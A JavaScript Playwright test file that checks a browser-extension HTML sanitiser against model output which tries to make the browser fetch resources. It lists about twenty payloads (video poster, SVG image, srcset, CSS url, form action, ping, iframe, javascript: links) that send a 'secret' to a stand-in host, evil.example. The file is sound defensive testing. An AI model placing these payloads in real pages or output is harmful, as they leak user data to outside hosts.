// The sanitiser (src/render.js) against model output that tries to make the browser fetch something: poster, SVG
// image, srcset, CSS, forms, MathML and media; links must stay http(s), mailto or #; cite markers can't land inside a
// tag. Runs the shipped code in a blank page; no extension, no key.
import { chromium } from 'playwright';
import { BROWSER } from './ext.mjs';
const b = await chromium.launch({ ...BROWSER, headless: true });
const p = await b.newPage();
await p.setContent('<!doctype html><title>t</title><body></body>');
for (const f of ['lib/purify.min.js', 'lib/marked.min.js', 'lib/katex/katex.min.js', 'src/render.js']) await p.addScriptTag({ path: `extension/${f}` });
const R = await p.evaluate(() => {
  const IP = window.__inpage, evil = 'https://evil.example/?d=secret';
  const payloads = [
    `<video poster="${evil}"></video>`, `<svg><image href="${evil}"></image></svg>`, `<svg><use href="${evil}#x"></use></svg>`,
    `<img src="${evil}">`, `<img srcset="${evil} 2x">`, `<picture><source srcset="${evil}"></picture>`, `<audio src="${evil}"></audio>`,
    `<p style="background:url(${evil})">x</p>`, `<style>p{background:url(${evil})}</style>`, `<table background="${evil}"><tr><td>x</td></tr></table>`,
    `<form action="${evil}"><button>go</button></form>`, `<a href="javascript:alert(1)">x</a>`, `<a href="data:text/html,hi">x</a>`, `<a ping="${evil}" href="https://ok.example">x</a>`,
    `<math><mi xlink:href="${evil}">x</mi></math>`, `<object data="${evil}"></object>`, `<link rel=prefetch href="${evil}">`, `<input type=image src="${evil}">`,
    `<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image href='${evil}'/></svg>">`, `<iframe src="${evil}"></iframe>`,
  ];
  const bad = [];
  // model output: no resource-bearing elements at all; a block's original HTML may keep SVG and MathML, but nothing that fetches
  const fetches = (html, tags = /^(video|audio|picture|source|svg|image|use|math|form|style|object|iframe|link|input)$/i) => { const d = document.createElement('div'); d.append(IP.fragment(html)); return [...d.querySelectorAll('*')].some(e => [...e.attributes].some(a => /evil\.example|javascript:|^data:text/i.test(a.value)) || tags.test(e.localName)); };
  for (const x of payloads) {
    if (fetches(IP.clean(x))) bad.push(['clean', x]);
    if (fetches(IP.markdown(x))) bad.push(['markdown', x]);
    if (fetches(IP.clean(x, [], { original: true }), /^(video|audio|picture|source|image|use|form|style|object|iframe|link|input)$/i)) bad.push(['original', x]);
  }
  const keepsLink = /href="https:\/\/ok\.example"/.test(IP.markdown('[ok](https://ok.example)'));
  const keepsImage = /src="https:\/\/site\.example\/fig\.png"/.test(IP.clean('<img src="https://site.example/fig.png">', ['https://site.example/fig.png']));
  const keepsMathML = /<math/.test(IP.clean('<p><math><mi>x</mi></math></p>', [], { original: true }));
  const keepsTable = /<table>/.test(IP.markdown('| a | b |\n|---|---|\n| 1 | 2 |'));
  const citeInTag = IP.citeHTML('[x](https://ok.example/{{q: hi}}) and {{q: there}}');
  const citeOk = (citeInTag.match(/class="cite/g) || []).length === 1 && !/href="[^"]*(cite|@@)/.test(citeInTag);
  return { bad, keepsLink, keepsImage, keepsMathML, keepsTable, citeOk };
});
await b.close();
const ok = !R.bad.length && R.keepsLink && R.keepsImage && R.keepsMathML && R.keepsTable && R.citeOk;
console.log(JSON.stringify({ ok, ...R }, null, 2));
process.exit(ok ? 0 : 1);
